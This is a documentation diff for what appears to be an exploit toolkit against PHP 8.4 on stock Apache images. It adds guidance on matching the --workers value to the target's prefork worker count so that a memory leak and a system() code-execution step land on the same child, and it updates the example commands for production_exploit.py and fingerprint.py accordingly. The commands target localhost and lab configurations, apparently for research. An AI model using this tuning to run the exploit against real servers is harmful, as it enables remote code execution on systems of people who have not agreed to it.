@@ -296,6 +296,24 @@ aarch64 offsets are present but have not been verified on real ARM hardware.
 Concurrent-load behavior is still under test; the current pinning assumes
 requests are not competing for the final free worker.
 
+### Worker count
+
+`--workers` must equal the target's total prefork worker count, not the number
+of connections you want to leave free:
+
+| Target | Effective `MaxRequestWorkers` | `--workers` |
+|---|---:|---:|
+| stock `php:8.4.*-apache`, `lab/prod-8426` | 150 | **150** |
+| `lab/httpd.conf`, `lab/httpd-session.conf` | 1 | **1** |
+| custom two-worker test pool | 2 | **2** |
+| 8.5 session lab | 1 | session chain: use `--rotate`, no `--workers` |
+
+The stock Apache images are 150-worker targets. Using `--workers 1` there does
+not pin anything: A1 and B1 land on different children, B1 returns no leak, and
+the attempt fails. A single-worker value is correct only for a target whose MPM
+is actually configured with `MaxRequestWorkers 1`. For any other pool size, pass
+that exact size.
+
 ### Proof without a target file
 
 The B2 HTTP response carries `system()` output. Because the stock INI sets
@@ -305,7 +323,7 @@ response, and confirms the marker. No target file or host mount is required:
 
 ```bash
 python3 production_exploit.py \
-    --host 127.0.0.1 --port 1337 --workers 1 \
+    --host 127.0.0.1 --port 1337 --workers 150 \
     --version 8.4.26 --response-proof
 ```
 
@@ -366,7 +384,7 @@ then the session-chain profiles:
 ```bash
 python3 fingerprint.py \
     -u http://127.0.0.1:1337/index.php \
-    --arch x86_64 --workers 1 \
+    --arch x86_64 --workers 150 \
     --run --try-all --proof-file /path/to/out/p1
 ```
 
@@ -379,5 +397,5 @@ For response-only proof, add `--response-proof` and omit `--proof-file`:
 ```bash
 python3 fingerprint.py \
     -u http://127.0.0.1:1337/index.php \
-    --arch x86_64 --workers 1 --run --response-proof
+    --arch x86_64 --workers 150 --run --response-proof
 ```
